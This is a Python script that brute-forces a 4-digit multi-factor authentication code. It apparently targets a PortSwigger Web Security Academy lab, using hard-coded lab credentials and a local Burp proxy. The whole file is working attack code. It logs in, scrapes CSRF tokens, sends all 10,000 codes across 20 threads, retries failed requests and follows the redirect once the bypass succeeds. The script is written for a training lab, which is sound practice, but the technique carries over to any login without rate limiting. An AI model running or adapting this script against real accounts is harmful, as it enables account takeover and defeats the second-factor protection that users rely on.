from concurrent.futures import ThreadPoolExecutor, as_completed
from requests import Session, exceptions
from bs4 import BeautifulSoup


ca_cert_path = "certs/burp_cacert_chain.pem"
base_url = "https://0a8000ed031ea729821e4ed6001800c3.web-security-academy.net"
endpoints = ["/login", "/login2"]
username = "carlos"
password = "montoya"
session_headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded"
}
session_proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

REPORT = 100
mfa_codes = [f"{i:04d}" for i in range(10000)]  # Generate codes 0000-9999
last_code_attempted = None
found_flag = False
failed_codes = []  # To track codes that need to be retried

def get_csrf_token(response):
    """Retrieve CSRF token from the specified URL."""
    try:
        soup = BeautifulSoup(response.text, "html.parser")
        csrf_token = soup.find("input", {"name": "csrf"})
        if csrf_token is None or "value" not in csrf_token.attrs:
            print(f"Failed to retrieve CSRF token from {response.url}. Retrying...")
            return None
        return csrf_token["value"]
    except Exception as e:
        print(f"Error parsing CSRF token from {response.url}: {e}")
        return None
    
def attempt_mfa_code(mfa_code):
    """Attempt to brute-force MFA with a specific code."""
    global found_flag, last_code_attempted

    if found_flag:  # Stop other threads if the flag is set
        return None

    with Session() as session:
        session.headers.update(session_headers)
        session.proxies.update(session_proxies)

        # Step 1: Login and retrieve CSRF token
        try:
            response = session.get(f"{base_url}{endpoints[0]}", verify=ca_cert_path, timeout=10)
            csrf_token = get_csrf_token(response)
            if not csrf_token:
                print(f"CSRF token missing for MFA code: {mfa_code}")
                return None
                
            payload = {"csrf": csrf_token, "username": username, "password": password}
            response = session.post(f"{base_url}{endpoints[0]}", data=payload, verify=ca_cert_path, allow_redirects=False, timeout=10)

            if response.status_code != 302:
                print(f"Login failed for MFA code: {mfa_code}. Retrying...")
                return None
                
            # Step 2: Test the MFA code
            response = session.get(f"{base_url}{endpoints[1]}", verify=ca_cert_path, timeout=10)
            csrf_token = get_csrf_token(response)
            if not csrf_token:
                return None

            payload = {"csrf": csrf_token, "mfa-code": mfa_code}
            response = session.post(f"{base_url}{endpoints[1]}", data=payload, verify=ca_cert_path, allow_redirects=False, timeout=10)
            
            if int(mfa_code) % REPORT == 0:
                print(f"Brute-force attempt with generated MFA code: {mfa_code}, Status: {response.status_code}")

            if response.status_code == 302:  # Successful MFA bypass
                found_flag = True
                last_code_attempted = mfa_code
                print(f"Successfully bypassed MFA with code: {mfa_code}")

                # Follow the redirect
                redirected_url = response.headers.get("Location")
                if redirected_url:
                    # Ensure the URL is absolute
                    if not redirected_url.startswith("http"):
                        redirected_url = f"{base_url}{redirected_url}"

                    print(f"Following redirect to: {redirected_url}")
                    final_response = session.get(redirected_url, verify=ca_cert_path)

                    # Print the final page content or URL
                    print(f"Logged in successfully. Final URL: {final_response.url}")
                    print(f"Final page content:\n{final_response.text[:500]}")  # Print snippet of page content for debugging
                return mfa_code
            
            elif response.status_code == 400:  # Too many attempts
                print("Too many failed attempts. Retrying...")

        except exceptions.RequestException as e:
            print(f"Request failed for MFA code {mfa_code}: {e}")
            failed_codes.append(mfa_code)  # Mark code for retry

    return None


def main():
    global found_flag

    def process_codes(codes):
        global found_flag
        with ThreadPoolExecutor(max_workers=20) as executor:
            future_to_code = {executor.submit(attempt_mfa_code, code): code for code in codes}
            for future in as_completed(future_to_code):
                result = future.result()
                if result:
                    found_flag = True
                    print(f"MFA brute-force successful with code: {result}")
                    break

    # Process initial codes
    process_codes(mfa_codes)

    # Retry failed codes if any and MFA was not already found
    if not found_flag and failed_codes:
        print(f"Retrying failed codes: {len(failed_codes)} remaining.")
        process_codes(failed_codes)

    if not found_flag:
        print("No valid MFA code found. Brute-force attack unsuccessful.")

    print("Closing session...")


if __name__ == "__main__":
    main()